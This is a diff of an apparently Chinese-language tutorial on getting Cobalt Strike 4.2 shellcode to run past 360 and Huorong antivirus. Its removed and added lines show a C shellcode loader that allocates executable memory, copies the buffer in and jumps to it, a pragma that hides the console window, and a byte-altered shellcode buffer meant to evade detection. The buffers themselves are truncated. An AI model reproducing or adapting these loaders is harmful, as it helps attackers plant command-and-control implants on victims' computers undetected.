@@ -2,27 +2,14 @@ CS版本：Cobalt Strike 4.2
 测试的杀软：360安全卫士v12、360杀毒、火绒
 
 # 0x00 shellcode上线测试
-Attacks->Packages->Payload Generator（选择之前创建的监听器，输出C格式，勾选x64）  
-生成的代码如下
+Attacks->Packages->Payload Generator（选择之前创建的监听器，输出C格式）  
+生成的代码如下  
 ```
-#include <windows.h>
-#include <stdio.h>
-
-#pragma comment(linker,"/subsystem:\"windows\" /entry:\"mainCRTStartup\"")
-
-/* length: 891 bytes */
-unsigned char buf[] = "\xfc\x48\x83\xe4\xf0\xe8\xc8\x00\x00...";
-
-int main() {
-    char* old= VirtualAlloc(NULL, sizeof(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-    memcpy(old, buf, sizeof(buf));
-    ((void(*)())old)();
-    return 0;
-}
+/* length: 833 bytes */
+unsigned char buf[] = "\xfc\xe8\x89\x00\x00\x00\x60...";
 ```
-下载并安装VS2019，安装时勾选C++和windows这2类，创建windows控制台项目
-
-直接在VS2019下编译会有类型匹配问题，需要对VirtualAlloc返回的值进行强制类型转换，能成功编译的代码如下
+下载并安装VS2019，安装时勾选C++和windows这2类，创建windows控制台项目  
+c语言实现loader，代码如下
 ```
 #include <windows.h>
 #include <stdio.h>
@@ -77,6 +64,8 @@ int main() {
 ```
 #include <stdio.h>
 #include <windows.h>
+
+#pragma comment(linker,"/subsystem:\"windows\" /entry:\"mainCRTStartup\"")
 
 unsigned char buf[] = "\xfd\x49\x82\xe5\xf1\xe9\xc9\x1...";
 
